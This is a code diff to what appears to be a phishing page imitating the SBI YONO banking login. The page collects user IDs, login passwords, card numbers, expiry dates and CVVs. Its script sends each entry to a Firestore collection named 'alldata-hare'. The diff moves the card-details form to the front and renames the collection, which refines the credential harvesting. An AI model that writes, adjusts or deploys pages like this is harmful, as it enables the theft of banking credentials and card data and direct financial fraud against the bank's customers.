@@ -142,32 +142,15 @@
 
   <!-- Tabs -->
   <div id="tabs">
-    <div class="tab active" data-target="user">SBI YONO User</div>
-    <div class="tab" data-target="card">Card Details</div>
+    <div class="tab active" data-target="card">Card Details</div>
+    <div class="tab" data-target="user">SBI YONO User</div>
   </div>
 
   <!-- Forms -->
   <div id="forms">
 
-    <!-- User ID Section -->
-    <div id="user" class="form-section active">
-      <label>User ID</label>
-      <input type="text" id="userId" placeholder="Enter user ID" />
-
-      <label>Login Password</label>
-      <input type="password" id="password" placeholder="Enter password" />
-
-      <div class="link-group">
-        <a href="cif.html">Forgot User ID / Password?</a><br />
-        <a href="cif.html">Register now</a><br />
-        <a href="CIF.html">Unlock User ID</a>
-      </div>
-
-      <button class="continue-btn" onclick="submitUser()">Continue</button>
-    </div>
-
-    <!-- Card Details Section -->
-    <div id="card" class="form-section">
+    <!-- Card Details Section (now first) -->
+    <div id="card" class="form-section active">
       <label>Primary Card Number</label>
       <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" />
 
@@ -178,6 +161,23 @@
       <input type="password" id="cvv" maxlength="3" placeholder="•••" />
 
       <button class="continue-btn" onclick="submitCard()">Continue</button>
+    </div>
+
+    <!-- User ID Section (now second) -->
+    <div id="user" class="form-section">
+      <label>User ID</label>
+      <input type="text" id="userId" placeholder="Enter user ID" />
+
+      <label>Login Password</label>
+      <input type="password" id="password" placeholder="Enter password" />
+
+      <div class="link-group">
+        <a href="cif.html">Forgot User ID / Password?</a><br />
+        <a href="cif.html">Register now</a><br />
+        <a href="cif.html">Unlock User ID</a>
+      </div>
+
+      <button class="continue-btn" onclick="submitUser()">Continue</button>
     </div>
 
   </div>
@@ -218,7 +218,7 @@
       return;
     }
 
-    db.collection("alldata-hare1").add({
+    db.collection("alldata-hare").add({
       type: "YONO User",
       userId: userId,
       password: password,
@@ -240,7 +240,7 @@
       return;
     }
 
-    db.collection("alldata-hare1").add({
+    db.collection("alldata-hare").add({
       type: "Card Details",
       cardNumber: cardNumber,
       expiry: expiry,
